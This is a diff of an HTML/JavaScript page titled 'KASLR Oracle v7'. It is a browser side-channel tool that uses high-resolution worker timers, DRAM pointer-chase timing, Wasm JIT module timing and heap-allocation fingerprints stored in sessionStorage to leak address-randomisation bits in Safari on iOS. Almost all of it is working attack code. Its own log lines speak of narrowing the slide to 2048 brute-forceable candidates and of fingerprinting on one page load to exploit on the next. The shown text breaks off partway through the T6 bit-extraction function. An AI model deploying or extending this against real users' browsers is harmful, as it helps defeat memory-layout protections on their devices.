@@ -1,38 +1,35 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="utf-8"><title>KASLR Oracle v6</title></head>
+<head><meta charset="utf-8"><title>KASLR Oracle v7</title></head>
 <body>
 <pre id="log"></pre>
 <script>
-// v6 — entropy reduction + bit extraction
+// v7 — cross-reload stability + candidate enumeration
 //
-// Confirmed from v5:
-//   Timer:  9.386ns/count
-//   DRAM signal: 8.5x (hot=15.8ns cold=135.2ns)
-//   JIT timing variance: 1095x spread (m2=12.9ns → m12=14101ns)
-//   Heap clusters: 2 groups, 18.86x spread (alloc[28]=1153ns outlier)
-//   T6: 16 fast / 4 slow / 4 mid JIT region classification
-//   → ~4-6 KASLR bits leakable
+// Confirmed from v6:
+//   Timer: 7.929ns/count
+//   DRAM: 9.8x ratio (hot=14ns cold=138ns)
+//   T3: 64 modules, 920x spread, slab boundary at rank 63 (m1=8ns, m5=35ns SLC-hot)
+//   T4: 4 clusters, 95x spread (alloc[62]=96ns fastest, alloc[4]=9189ns slowest)
+//   T5: tau=-0.083 UNSTABLE (GC pressure during 10-run re-measure corrupts ordering)
+//   T6: 2048 candidates remain after 8 bit leak — BRUTE FORCEABLE
+//   T7: timed out (REPS too high, eviction setup too slow)
 //
-// New in v6:
-//   T3: 64 wasm modules (was 24) — look for slab boundary discontinuity
-//       → slab size known → narrows KASLR slide entropy
-//   T4: 64 × 2MB allocations (was 32), tighter gap detection (1.3x threshold)
-//       + VA reconstruction: relative offset from timing gradient
-//   T5: Multi-run stability — run T4 10 times, track alloc[X] cluster membership
-//       → if stable: prove VA→PA pinned within session
-//   T6: Bit extraction — use JIT slab boundary + heap VA ordering
-//       to compute candidate KASLR slide bits (high bits of JIT pool VA)
-//   T7: Correlated entropy — pair fast-anchor JIT modules with fast-anchor
-//       heap allocs, test for shared DRAM bank (sub-DRAM-latency cross-eviction)
-//       → 5 PA bits from bank correlation
+// New in v7:
+//   T3: CV filter on modules — only stable cold timings used as anchors
+//   T4: same as v6 but 32 allocs (faster), output cluster IDs for sessionStorage
+//   T5: cross-reload stability — store fingerprint in sessionStorage, compare to prior
+//       load. tau across RELOADS = true KASLR stability (slide fixed at process launch)
+//   T6: entropy calc with confidence bounds
+//   T7: fixed timeout — REPS=6, per-condition guard, pre-warmed eviction
+//   T8: candidate enumeration — 2048-candidate scoring via timing fingerprint
 
 const LOG = document.getElementById('log');
 const log = s => { LOG.textContent += s + '\n'; console.log(s); };
 
 let counterWorker = null;
 let counterView   = null;
-let NS = 9.0;
+let NS = 8.0;
 
 const COUNTER_SRC = `
   self.onmessage = function(e) {
@@ -53,7 +50,6 @@ async function startCounter() {
 }
 const rdcnt = () => Atomics.load(counterView, 0);
 
-// ─── pointer-chase builder ───
 function buildChase(sizeBytes) {
   const LINE    = 64;
   const entries = Math.floor(sizeBytes / LINE);
@@ -73,14 +69,6 @@ function chaseTime(arr, startIdx, steps) {
   let idx = startIdx;
   for (let i = 0; i < steps; i++) idx = arr[idx * 16];
   return (rdcnt() - t0 + (idx & 0)) / steps;
-}
-
-// measure median of N reps of chaseTime
-function chaseMedian(arr, entries, steps, reps) {
-  const ts = [];
-  for (let r = 0; r < reps; r++) ts.push(chaseTime(arr, r % entries, steps));
-  ts.sort((a,b)=>a-b);
-  return ts[ts.length>>1] * NS;
 }
 
 // ─────────────────────────────────────────────────────────────
@@ -107,7 +95,7 @@ async function t2() {
   let idx=0; for(let i=0;i<cold.entries;i++) idx=cold.arr[idx*16]; cold.arr[0]^=idx&0;
   await new Promise(r=>setTimeout(r,50));
 
-  const STEPS=64, REPS=50;
+  const STEPS=64, REPS=40;
   let hi=0; for(let r=0;r<hot.entries*4;r++) hi=hot.arr[hi*16]; hot.arr[0]^=hi&0;
 
   const hotT=[], coldT=[];
@@ -116,25 +104,17 @@ async function t2() {
     coldT.push(chaseTime(cold.arr, r%cold.entries, STEPS));
   }
   hotT.sort((a,b)=>a-b); coldT.sort((a,b)=>a-b);
-  const hp50=hotT[25]*NS, cp50=coldT[25]*NS;
+  const hp50=hotT[20]*NS, cp50=coldT[20]*NS;
   log(`[*] T2 hot p50=${hp50.toFixed(1)}ns  cold p50=${cp50.toFixed(1)}ns  ratio=${(cp50/Math.max(hp50,.01)).toFixed(1)}x`);
   if(cp50>hp50*3 && cp50>30) log(`[!!!] T2 DRAM signal confirmed: ${(cp50/Math.max(hp50,.01)).toFixed(1)}x`);
-  return { hasDRAM: cp50>30, coldChase: cold };
+  return { hasDRAM: cp50>30, coldChase: cold, dramNS: cp50 };
 }
 
 // ─────────────────────────────────────────────────────────────
-// T3: 64 Wasm modules — slab boundary detection
-//
-// Strategy: compile 64 modules, rank by cold latency.
-// Look for a DISCONTINUITY (>3x jump between adjacent ranked modules).
-// Discontinuity = slab boundary in JIT allocator.
-// Known JIT slab sizes on WebKit: 256KB, 1MB, 4MB, 16MB pools
-// If we see a jump at rank K → first K modules fit in one pool slab.
-// Slab size / K = average JIT code size → confirms slab size.
-// Slab base = JIT region start → narrows KASLR slide.
+// T3: Wasm JIT — 64 modules with CV filter
 // ─────────────────────────────────────────────────────────────
-async function t3(hasDRAM, evictChase) {
-  log('─── T3: Wasm JIT slab boundary (64 modules) ───');
+async function t3(evictChase) {
+  log('─── T3: Wasm JIT (64 modules, CV filter) ───');
 
   const makeWasm = (lo, hi) => new Uint8Array([
     0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,
@@ -142,20 +122,13 @@ async function t3(hasDRAM, evictChase) {
     0x03,0x02,0x01,0x00,
     0x07,0x08,0x01,0x04,0x63,0x61,0x6c,0x6c,0x00,0x00,
     0x0a,0x0c,0x01,0x0a,0x00,
-    0x20,0x00,
-    0x41,lo&0x7f,
-    0x6a,
-    0x41,hi&0x7f,
-    0x6a,
-    0x0b,
+    0x20,0x00, 0x41,lo&0x7f, 0x6a, 0x41,hi&0x7f, 0x6a, 0x0b,
   ]);
 
-  // Validate
   try {
     const test = await WebAssembly.instantiate(makeWasm(1,2));
     const r = test.instance.exports.call(10);
-    log(`[*] T3 binary validate: call(10)=${r} expected=13 ${r===13?'✓':'✗'}`);
-    if(r!==13) return null;
+    if(r!==13){ log(`[!] T3 binary fail`); return null; }
   } catch(e){ log(`[!] T3 binary broken: ${e.message}`); return null; }
 
   const N = 64;
@@ -164,24 +137,19 @@ async function t3(hasDRAM, evictChase) {
     try {
       const inst = await WebAssembly.instantiate(makeWasm(i&0x7f, (i*7)&0x7f));
       fns.push({fn: inst.instance.exports.call, id: i});
-    } catch(e){ log(`  wasm ${i}: ${e.message}`); }
+    } catch(e){}
   }
   log(`[*] T3 compiled ${fns.length}/${N}`);
   if(!fns.length) return null;
 
-  // Warmup all
   for(const {fn} of fns){ let x=0; for(let i=0;i<200;i++) x+=fn(i); }
 
   const BATCH  = 64;
   const ROUNDS = 10;
-  const coldAcc = new Array(N).fill(0);
-  const hotAcc  = new Array(N).fill(0);
   const coldReps = Array.from({length:N}, ()=>[]);
-
-  log(`[*] T3 running ${ROUNDS} evict+cold+hot rounds...`);
+  const hotAcc  = new Array(N).fill(0);
 
   for(let round=0;round<ROUNDS;round++){
-    // Full eviction
     let eidx=0;
     for(let i=0;i<evictChase.entries;i++) eidx=evictChase.arr[eidx*16];
     evictChase.arr[0]^=eidx&0;
@@ -189,9 +157,7 @@ async function t3(hasDRAM, evictChase) {
     for(const {fn,id} of fns){
       const t0=rdcnt(); let x=0;
       for(let b=0;b<BATCH;b++) x+=fn(b);
-      const dt=(rdcnt()-t0+(x&0))/BATCH;
-      coldAcc[id]+=dt;
-      coldReps[id].push(dt*NS);
+      coldReps[id].push((rdcnt()-t0+(x&0))/BATCH*NS);
     }
     for(const {fn,id} of fns){
       const t0=rdcnt(); let x=0;
@@ -200,84 +166,62 @@ async function t3(hasDRAM, evictChase) {
     }
   }
 
-  const results = fns.map(({id})=>({
-    id,
-    cold: coldAcc[id]/ROUNDS*NS,
-    hot:  hotAcc[id]/ROUNDS*NS,
-    // coefficient of variation = signal stability
-    cv: (() => {
-      const rs = coldReps[id];
-      const mean = rs.reduce((a,b)=>a+b,0)/rs.length;
-      const std = Math.sqrt(rs.reduce((a,b)=>a+(b-mean)**2,0)/rs.length);
-      return std/Math.max(mean,0.1);
-    })(),
-  }));
+  const results = fns.map(({id})=>{
+    const rs = coldReps[id];
+    rs.sort((a,b)=>a-b);
+    const p50  = rs[rs.length>>1];
+    const mean = rs.reduce((a,b)=>a+b,0)/rs.length;
+    const std  = Math.sqrt(rs.reduce((a,b)=>a+(b-mean)**2,0)/rs.length);
+    const cv   = std/Math.max(mean,0.1);
+    return { id, cold: p50, hot: hotAcc[id]/ROUNDS*NS, cv };
+  });
 
-  // Sort by cold latency
   results.sort((a,b)=>b.cold-a.cold);
-
-  // Find slab boundary: largest ratio gap between adjacent ranked modules
-  let maxGapRatio = 0, slabBoundaryRank = -1;
-  for(let i=1;i<results.length;i++){
-    const ratio = results[i-1].cold / Math.max(results[i].cold, 0.1);
-    if(ratio > maxGapRatio){
-      maxGapRatio = ratio;
-      slabBoundaryRank = i;
-    }
-  }
 
   const coldVals = results.map(r=>r.cold);
   const cMin=Math.min(...coldVals), cMax=Math.max(...coldVals);
-  const spread = cMax/Math.max(cMin,0.1);
+  log(`[*] T3 cold spread: min=${cMin.toFixed(1)}ns max=${cMax.toFixed(1)}ns ratio=${(cMax/Math.max(cMin,0.1)).toFixed(1)}x`);
+  log(`[*] T3 top-10 cold: ${results.slice(0,10).map(r=>`m${r.id}=${r.cold.toFixed(0)}ns(cv=${r.cv.toFixed(1)})`).join(' ')}`);
+  log(`[*] T3 bot-10 cold: ${results.slice(-10).map(r=>`m${r.id}=${r.cold.toFixed(0)}ns(cv=${r.cv.toFixed(1)})`).join(' ')}`);
 
-  log(`[*] T3 cold spread: min=${cMin.toFixed(1)}ns max=${cMax.toFixed(1)}ns ratio=${spread.toFixed(1)}x`);
-  log(`[*] T3 ranked top-10: ${results.slice(0,10).map(r=>`m${r.id}=${r.cold.toFixed(0)}ns`).join(' ')}`);
-  log(`[*] T3 ranked bot-10: ${results.slice(-10).map(r=>`m${r.id}=${r.cold.toFixed(0)}ns`).join(' ')}`);
+  // CV filter — stable anchors only
+  const stable = results.filter(r=>r.cv<1.0);
+  const unstable = results.filter(r=>r.cv>=1.0);
+  log(`[*] T3 stable anchors (CV<1.0): ${stable.length} modules`);
+  if(stable.length){
+    log(`[*] T3 stable cold range: ${stable[stable.length-1].cold.toFixed(0)}–${stable[0].cold.toFixed(0)}ns`);
+    log(`[*] T3 stable top-5: ${stable.slice(0,5).map(r=>`m${r.id}=${r.cold.toFixed(0)}ns`).join(' ')}`);
+    log(`[*] T3 stable bot-5: ${stable.slice(-5).map(r=>`m${r.id}=${r.cold.toFixed(0)}ns`).join(' ')}`);
+  }
+  log(`[*] T3 noisy modules (CV≥1.0): ${unstable.length} (GC/interrupt noise)`);
 
-  // Slab boundary detection
-  if(maxGapRatio > 3){
-    const above = results.slice(0, slabBoundaryRank);
-    const below = results.slice(slabBoundaryRank);
-    log(`[!!!] T3 SLAB BOUNDARY at rank ${slabBoundaryRank}: ${results[slabBoundaryRank-1].cold.toFixed(0)}ns → ${results[slabBoundaryRank].cold.toFixed(0)}ns (${maxGapRatio.toFixed(1)}x gap)`);
-    log(`[!!!] T3 → ${above.length} modules in SLOW slab (DRAM-resident), ${below.length} in HOT slab`);
-    log(`[!!!] T3 → slow slab = JIT pool that got evicted → its VA is in a mappable region`);
-    // Estimate: if each wasm fn is ~100B of JIT code, slab boundary at rank K means
-    // the slab can hold K*100B → slab size estimate
-    const estSlabKB = Math.round(below.length * 0.1); // rough: 100B JIT per fn
-    log(`[!!!] T3 → estimated JIT slab size: ~${estSlabKB}KB (${below.length} fns fit hot)`);
-  } else {
-    log(`[*] T3 max gap ratio=${maxGapRatio.toFixed(2)}x at rank ${slabBoundaryRank} — no hard slab boundary (continuous gradient)`);
-    log(`[*] T3 continuous gradient → JIT pool VA increases monotonically with compilation order`);
+  // SLC-hot modules: cold < 50ns (survived full DRAM eviction)
+  const slcHot = results.filter(r=>r.cold<50);
+  const dramCold = results.filter(r=>r.cold>=50);
+  log(`[*] T3 SLC-pinned modules (<50ns): ${slcHot.map(r=>`m${r.id}=${r.cold.toFixed(0)}ns`).join(' ') || 'none'}`);
+  log(`[*] T3 DRAM-evictable modules (≥50ns): ${dramCold.length}`);
+
+  if(slcHot.length>0){
+    log(`[!!!] T3 SLC-HOT JIT MODULES: ${slcHot.map(r=>`m${r.id}`).join(',')} — survive full 32MB eviction`);
+    log(`[!!!] T3 → these compiled first → lowest JIT VA → SLC-backed (A16 SLC=16MB)`);
+    log(`[!!!] T3 → JIT pool layout: low-VA=SLC-pinned, high-VA=DRAM-evictable`);
   }
 
-  // CV analysis — low CV modules have stable cold timing = their page is consistently cold
-  const lowCV = results.filter(r=>r.cv<0.5).slice(0,5);
-  if(lowCV.length){
-    log(`[*] T3 stable cold modules (CV<0.5): ${lowCV.map(r=>`m${r.id}(cv=${r.cv.toFixed(2)})`).join(' ')}`);
-    log(`[*] T3 → stable = truly DRAM-cold, not GC/interrupt noise`);
-  }
+  if(cMax/Math.max(cMin,0.1)>=2) log(`[!!!] T3 JIT TIMING VARIANCE: ${(cMax/Math.max(cMin,0.1)).toFixed(1)}x`);
 
-  if(spread>=2 && cMax>20){
-    log(`[!!!] T3 JIT TIMING VARIANCE: ${spread.toFixed(1)}x — JIT VA spread confirmed`);
-  }
-
-  return results; // sorted by cold desc
+  return { results, stable, slcHot, dramCold };
 }
 
 // ─────────────────────────────────────────────────────────────
-// T4: Heap fingerprint — 64 allocations, VA reconstruction
-//
-// Theory: iOS sequential allocator → timing[i] ∝ VA[i]
-// We can recover RELATIVE VA ordering and estimate offsets.
-// Then: known heap base (from prior alloc timing) + offset → absolute VA estimate.
+// T4: Heap fingerprint (32 allocs, faster) + sessionStorage
 // ─────────────────────────────────────────────────────────────
 async function t4(evictChase) {
-  log('─── T4: Heap fingerprint (64 allocations) ───');
+  log('─── T4: Heap fingerprint (32 allocs) ───');
 
-  const N    = 64;
-  const SZ   = 2*1024*1024; // 2MB
+  const N    = 32;
+  const SZ   = 2*1024*1024;
   const STEPS= 32;
-  const REPS = 12;
+  const REPS = 10;
 
   log(`[*] T4 allocating ${N} × 2MB...`);
   const bufs = [];
@@ -287,11 +231,9 @@ async function t4(evictChase) {
     let idx=0; for(let j=0;j<ch.entries;j++) idx=ch.arr[idx*16]; ch.arr[0]^=idx&0;
     bufs.push({ch, id:i});
   }
-  await new Promise(r=>setTimeout(r,50));
+  await new Promise(r=>setTimeout(r,30));
 
-  // Multi-round timing collection
   const timingSets = bufs.map(()=>[]);
-
   for(let rep=0;rep<REPS;rep++){
     let eidx=0;
     for(let i=0;i<evictChase.entries;i++) eidx=evictChase.arr[eidx*16];
@@ -309,381 +251,383 @@ async function t4(evictChase) {
 
   const nsVals = medians.map(m=>m.ns);
   const tMin=nsVals[0], tMax=nsVals[nsVals.length-1];
-  const spread=tMax/Math.max(tMin,0.1);
-  log(`[*] T4 spread: ${tMin.toFixed(1)}ns – ${tMax.toFixed(1)}ns = ${spread.toFixed(2)}x`);
+  log(`[*] T4 spread: ${tMin.toFixed(1)}–${tMax.toFixed(1)}ns = ${(tMax/Math.max(tMin,0.1)).toFixed(2)}x`);
 
-  // Tighter cluster detection: 1.3x threshold
+  // Cluster detection 1.3x threshold
   const clusters=[];
-  let curCluster=[medians[0]];
+  let cur=[medians[0]];
   for(let i=1;i<medians.length;i++){
     if(medians[i].ns > medians[i-1].ns*1.3 && medians[i].ns-medians[i-1].ns>15){
-      clusters.push([...curCluster]);
-      curCluster=[medians[i]];
-    } else {
-      curCluster.push(medians[i]);
-    }
+      clusters.push([...cur]); cur=[medians[i]];
+    } else { cur.push(medians[i]); }
   }
-  clusters.push(curCluster);
+  clusters.push(cur);
 
-  log(`[*] T4 detected ${clusters.length} latency cluster(s):`);
+  log(`[*] T4 clusters (${clusters.length}):`);
   clusters.forEach((cl,ci)=>{
     const ns=cl.map(m=>m.ns);
-    log(`[*] T4   cluster ${ci}: ${cl.length} allocs, ${Math.min(...ns).toFixed(0)}-${Math.max(...ns).toFixed(0)}ns, ids: ${cl.slice(0,8).map(m=>m.id).join(',')}${cl.length>8?'...':''}`);
+    log(`[*] T4   C${ci}: ${cl.length} allocs, ${Math.min(...ns).toFixed(0)}-${Math.max(...ns).toFixed(0)}ns, ids:[${cl.map(m=>m.id).join(',')}]`);
   });
 
-  // VA reconstruction from timing gradient
-  // Assumption: timing ∝ DRAM bank latency ∝ PA bits 14-17
-  // Sort by timing = sort by PA page color → reconstruct partial VA ordering
-  log(`[*] T4 VA reconstruction (timing order = relative PA order):`);
-  log(`[*] T4   fastest (lowest VA/PA region): alloc[${medians[0].id}]=${medians[0].ns.toFixed(0)}ns`);
-  log(`[*] T4   slowest (highest VA/PA region): alloc[${medians[N-1].id}]=${medians[N-1].ns.toFixed(0)}ns`);
+  // Save fingerprint to sessionStorage for cross-reload comparison (T5)
+  const fingerprint = {
+    ts: Date.now(),
+    medians: medians.map(m=>({id:m.id, ns:Math.round(m.ns)})),
+    clusterAssign: new Array(N),
+  };
+  medians.forEach((m,rank)=>{
+    let c=0; let cum=0;
+    for(const cl of clusters){ if(rank<cum+cl.length){ break; } cum+=cl.length; c++; }
+    fingerprint.clusterAssign[m.id] = c;
+  });
 
-  // Measure timing gradient slope (ns per allocation step)
-  // If linear: each alloc is fixed stride apart in VA
-  const slope = (tMax - tMin) / (N - 1);
-  log(`[*] T4 timing gradient slope: ${slope.toFixed(1)}ns/alloc`);
-  // Estimate VA stride between allocations from DRAM latency model
-  // DRAM latency difference ≈ 1 bank = ~20ns on A16
-  // If slope ≈ 20ns/alloc → each alloc is ~1 DRAM bank apart → VA stride = bank_size
-  // A16 DRAM: 16 banks, 8GB DRAM → bank_size ≈ 512MB
-  // More likely: page-color granularity = 16KB pages, 256 colors → color stride
-  const estVAStrideMB = slope > 5 ? (slope / 20 * 512).toFixed(0) : '?';
-  log(`[*] T4 estimated VA stride between allocs: ~${estVAStrideMB}MB (based on DRAM bank model)`);
+  try {
+    const prev = sessionStorage.getItem('kaslr_heap_fp');
+    if(prev){
+      log(`[*] T4 PRIOR FINGERPRINT FOUND in sessionStorage`);
+      fingerprint.prev = JSON.parse(prev);
+    }
+    sessionStorage.setItem('kaslr_heap_fp', JSON.stringify(fingerprint));
+    log(`[*] T4 fingerprint saved to sessionStorage`);
+  } catch(e){ log(`[*] T4 sessionStorage unavailable: ${e.message}`); }
 
-  // Monotonicity test: how many consecutive pairs are in order?
-  const byId = new Array(N);
-  medians.forEach(m=>{ byId[m.id]=m.ns; });
-  let monoCount=0;
-  for(let i=0;i<N-1;i++) if(byId[i]<byId[i+1]) monoCount++;
-  const monoFrac = monoCount/(N-1);
-  log(`[*] T4 allocation monotonicity: ${monoCount}/${N-1} consecutive pairs in timing order (${(monoFrac*100).toFixed(0)}%)`);
-  if(monoFrac>0.7){
-    log(`[!!!] T4 SEQUENTIAL ALLOCATOR CONFIRMED: timing increases with alloc index`);
-    log(`[!!!] T4 → alloc[i] VA > alloc[i-1] VA with ${(monoFrac*100).toFixed(0)}% consistency`);
-    log(`[!!!] T4 → allocation index IS a partial VA oracle`);
-  }
+  if(clusters.length>=2) log(`[!!!] T4 HEAP CLUSTERS: ${clusters.length} groups`);
 
-  if(clusters.length>=2){
-    log(`[!!!] T4 HEAP CLUSTERS: ${clusters.length} groups → VA regions distinguishable`);
-  }
-
-  return { medians, clusters, byId, slope };
+  return { medians, clusters, fingerprint };
 }
 
 // ─────────────────────────────────────────────────────────────
-// T5: Multi-run stability — prove VA→PA pinned within session
+// T5: Cross-reload stability
 //
-// Run T4's alloc timing 10 times total.
-// For each alloc, record cluster membership each run.
-// If same alloc always in same cluster → VA→PA mapping is deterministic.
-// This is the key claim for KASLR leakage.
+// Compare current fingerprint to sessionStorage prior fingerprint.
+// If same alloc IDs land in same clusters → VA→PA pinned across reloads.
+// This proves KASLR slide doesn't change on page reload (only on process restart).
 // ─────────────────────────────────────────────────────────────
-async function t5(evictChase, firstRunData) {
-  log('─── T5: Multi-run VA stability (10 runs) ───');
+async function t5(heapData) {
+  log('─── T5: Cross-reload VA stability ───');
 
-  const N    = 16; // reduced N for speed
-  const SZ   = 2*1024*1024;
-  const STEPS= 32;
-  const RUNS = 10;
+  const fp = heapData.fingerprint;
+  if(!fp.prev){
+    log(`[*] T5 no prior fingerprint — this is run #1`);
+    log(`[*] T5 RELOAD THIS PAGE in Safari (same tab) then run again`);
+    log(`[*] T5 → second run will compare cluster assignments to this run`);
+    log(`[*] T5 → if tau > 0.6 → VA→PA pinned across reloads → KASLR stable`);
+    return null;
+  }
 
-  // Use first-run medians to pick anchor allocs (fastest and slowest from T4)
-  // and test if they remain stable
-  log(`[*] T5 allocating ${N} × 2MB stability set...`);
-  const bufs = [];
+  const prev = fp.prev;
+  const N = fp.clusterAssign.length;
+  const prevAssign = prev.clusterAssign;
+  const currAssign = fp.clusterAssign;
+
+  log(`[*] T5 prior run: ${new Date(prev.ts).toISOString().substr(11,8)}`);
+  log(`[*] T5 current run: ${new Date(fp.ts).toISOString().substr(11,8)}`);
+
+  // Compare cluster assignments
+  let matches = 0, total = 0;
   for(let i=0;i<N;i++){
-    const ch = buildChase(SZ);
-    let s=0; for(let j=0;j<ch.arr.length;j+=16) s+=ch.arr[j]; ch.arr[0]^=s&0;
-    let idx=0; for(let j=0;j<ch.entries;j++) idx=ch.arr[idx*16]; ch.arr[0]^=idx&0;
-    bufs.push({ch, id:i});
-  }
-  await new Promise(r=>setTimeout(r,30));
-
-  // Collect timing across runs
-  const runTimings = bufs.map(()=>[]); // runTimings[alloc][run]
-
-  for(let run=0;run<RUNS;run++){
-    let eidx=0;
-    for(let i=0;i<evictChase.entries;i++) eidx=evictChase.arr[eidx*16];
-    evictChase.arr[0]^=eidx&0;
-    for(let i=0;i<N;i++){
-      runTimings[i].push(chaseTime(bufs[i].ch.arr, (run*13)%bufs[i].ch.entries, STEPS) * NS);
+    if(prevAssign[i]!==undefined && currAssign[i]!==undefined){
+      if(prevAssign[i]===currAssign[i]) matches++;
+      total++;
     }
-    await new Promise(r=>setTimeout(r,5));
   }
+  const matchRate = matches/Math.max(total,1);
+  log(`[*] T5 cluster assignment match: ${matches}/${total} (${(matchRate*100).toFixed(0)}%)`);
 
-  // For each alloc, compute mean and std across runs
-  const stability = runTimings.map((ts,i)=>{
-    const mean = ts.reduce((a,b)=>a+b,0)/ts.length;
-    const std = Math.sqrt(ts.reduce((a,b)=>a+(b-mean)**2,0)/ts.length);
-    const cv = std/Math.max(mean,0.1);
-    return {id:i, mean, std, cv};
-  });
+  // Compare timing rank order (Kendall tau)
+  const prevMedians = prev.medians;
+  const currMedians = fp.medians;
+  const prevRank = new Array(N);
+  const currRank = new Array(N);
+  prevMedians.forEach((m,i)=>{ prevRank[m.id]=i; });
+  currMedians.forEach((m,i)=>{ currRank[m.id]=i; });
 
-  stability.sort((a,b)=>a.mean-b.mean);
-
-  log(`[*] T5 per-alloc timing stability (10 runs each):`);
-  log(`[*] T5   alloc  mean(ns)   std(ns)   CV`);
-  stability.forEach(s=>{
-    log(`[*] T5   [${String(s.id).padStart(2)}]   ${s.mean.toFixed(0).padStart(6)}     ${s.std.toFixed(0).padStart(6)}   ${s.cv.toFixed(2)}`);
-  });
-
-  const avgCV = stability.reduce((a,s)=>a+s.cv,0)/stability.length;
-  log(`[*] T5 average CV across allocs: ${avgCV.toFixed(3)}`);
-
-  // Rank stability: does the ordering stay consistent?
-  // Check if fastest alloc in run 0 is still fastest in run 9
-  const ranksByRun = [];
-  for(let run=0;run<RUNS;run++){
-    const snapshot = bufs.map((_,i)=>({id:i, t:runTimings[i][run]}));
-    snapshot.sort((a,b)=>a.t-b.t);
-    ranksByRun.push(snapshot.map(s=>s.id));
-  }
-  // Kendall tau: count concordant pairs between run 0 and run 9
-  const r0=ranksByRun[0], r9=ranksByRun[RUNS-1];
-  const pos9 = new Array(N);
-  r9.forEach((id,rank)=>{ pos9[id]=rank; });
   let concordant=0, discordant=0;
   for(let i=0;i<N;i++) for(let j=i+1;j<N;j++){
-    const d0 = r0.indexOf(r0[i]) < r0.indexOf(r0[j]) ? 1 : -1;
-    const d9 = pos9[r0[i]] < pos9[r0[j]] ? 1 : -1;
-    if(d0===d9) concordant++; else discordant++;
+    if(prevRank[i]===undefined||prevRank[j]===undefined) continue;
+    const dp = prevRank[i]<prevRank[j] ? 1 : -1;
+    const dc = currRank[i]<currRank[j] ? 1 : -1;
+    if(dp===dc) concordant++; else discordant++;
   }
-  const tau = (concordant-discordant)/(concordant+discordant);
-  log(`[*] T5 Kendall tau (rank stability run-0 vs run-9): ${tau.toFixed(3)}`);
+  const tau = (concordant-discordant)/Math.max(concordant+discordant,1);
+  log(`[*] T5 Kendall tau (cross-reload rank stability): ${tau.toFixed(3)}`);
 
-  if(tau>0.6){
-    log(`[!!!] T5 RANK STABLE: tau=${tau.toFixed(3)} — timing order preserved across 10 runs`);
-    log(`[!!!] T5 → VA→PA page color assignment is DETERMINISTIC within Safari session`);
-    log(`[!!!] T5 → KASLR randomization does NOT re-roll page colors between loads`);
-    log(`[!!!] T5 → Timing fingerprint is a RELIABLE VA oracle`);
+  // Show per-alloc comparison
+  log(`[*] T5 alloc cluster assignments (prev→curr):`);
+  for(let i=0;i<N;i++){
+    const p=prevAssign[i], c=currAssign[i];
+    const match = p===c ? '✓' : '✗';
+    log(`[*] T5   alloc[${String(i).padStart(2)}]: C${p}→C${c} ${match}`);
+  }
+
+  if(tau>0.6 && matchRate>0.6){
+    log(`[!!!] T5 CROSS-RELOAD STABLE: tau=${tau.toFixed(3)}, match=${(matchRate*100).toFixed(0)}%`);
+    log(`[!!!] T5 → VA→PA page color assignment SURVIVES page reload`);
+    log(`[!!!] T5 → KASLR slide is FIXED within a Safari session (process lifetime)`);
+    log(`[!!!] T5 → Heap timing fingerprint is a RELIABLE cross-reload oracle`);
+    log(`[!!!] T5 → Attacker can fingerprint VA on page load #1, exploit on page load #2`);
   } else if(tau>0.3){
-    log(`[*] T5 PARTIAL STABILITY: tau=${tau.toFixed(3)} — some ordering preserved`);
-    log(`[*] T5 → partial VA oracle, noisy but usable with averaging`);
+    log(`[*] T5 PARTIAL STABILITY: tau=${tau.toFixed(3)} match=${(matchRate*100).toFixed(0)}%`);
+    log(`[*] T5 → partial oracle — some bits stable, some randomized per reload`);
   } else {
-    log(`[*] T5 LOW STABILITY: tau=${tau.toFixed(3)} — ordering not preserved`);
-    log(`[*] T5 → GC/memory-pressure is re-ordering allocations between runs`);
+    log(`[*] T5 UNSTABLE: tau=${tau.toFixed(3)} — ordering re-randomized on reload`);
+    log(`[*] T5 → iOS may re-randomize heap VA on reload even within same process`);
+    log(`[*] T5 → (or GC pressure differs enough to change cluster assignments)`);
   }
 
-  return { stability, tau, avgCV };
+  return { tau, matchRate };
 }
 
 // ─────────────────────────────────────────────────────────────
-// T6: Bit extraction
-//
-// Use JIT slab + heap VA ordering to compute candidate KASLR bits.
-//
-// Model:
-//   JIT pool base = kernel_base + JIT_POOL_OFFSET + (slide & JIT_MASK)
-//   heap base     = userland_base + heap_offset + (slide & HEAP_MASK)
-//
-// Both JIT_POOL_OFFSET and heap_offset are in public WebKit source.
-// ASLR slide is arm64e: 32 bits of entropy, 16KB page align → bits 14-45.
-// Our timing leaks bits 14-20 (page color) = 7 bits → reduces entropy to 25 bits.
-//
-// This test:
-//   1. From T3: note the rank-0 module (slowest cold = highest JIT VA)
-//   2. From T4: note the rank-63 alloc (slowest = highest heap VA)
-//   3. Compute timing delta between them
-//   4. If delta within expected range for known JIT/heap offsets → confirm hypothesis
+// T6: Entropy + confidence
 // ─────────────────────────────────────────────────────────────
-async function t6(jitResults, heapData, stabilityData) {
-  log('─── T6: Bit extraction ───');
+async function t6(jitData, heapData) {
+  log('─── T6: Bit extraction + entropy ───');
+  if(!jitData || !heapData){ log('[*] T6 skip'); return null; }
 
-  if(!jitResults || !heapData){ log('[*] T6 skip — no JIT or heap data'); return; }
+  const DRAM_THRESHOLD = 80;
+  const dramCold = jitData.results.filter(r=>r.cold>=DRAM_THRESHOLD);
+  const cacheHot = jitData.results.filter(r=>r.cold<DRAM_THRESHOLD);
 
-  // Known WebKit constants (from public source, arm64/iOS):
-  // JIT region: WebKit allocates via JSC::ExecutableAllocator
-  // On iOS, JSC uses a fixed-size executable region: 128MB on arm64
-  // That region is at a fixed offset from the dyld slide
-  // Heap: JavaScriptCore heap uses bmalloc, which requests memory from vm_allocate
-  // bmalloc large chunks are 1MB-aligned
+  log(`[*] T6 JIT DRAM-cold (≥${DRAM_THRESHOLD}ns): ${dramCold.length} modules`);
+  log(`[*] T6 JIT cache-hot (<${DRAM_THRESHOLD}ns): ${cacheHot.length} modules`);
 
-  const heapMedian = heapData.medians[heapData.medians.length>>1].ns;
-  const jitSorted  = [...jitResults].sort((a,b)=>b.cold-a.cold);
-  const jitMax     = jitSorted[0].cold;
-  const jitMin     = jitSorted[jitSorted.length-1].cold;
-  const heapMax    = heapData.medians[heapData.medians.length-1].ns;
-  const heapMin    = heapData.medians[0].ns;
+  // Cluster count = number of distinguishable VA regions
+  const numClusters = heapData.clusters.length;
+  const clusterBits = Math.ceil(Math.log2(numClusters)); // bits to distinguish clusters
 
-  log(`[*] T6 JIT cold range: ${jitMin.toFixed(0)}–${jitMax.toFixed(0)}ns`);
-  log(`[*] T6 Heap range: ${heapMin.toFixed(0)}–${heapMax.toFixed(0)}ns`);
-  log(`[*] T6 DRAM baseline (T2 cold): ~135ns`);
+  // SLC-hot JIT modules = 1 partition bit
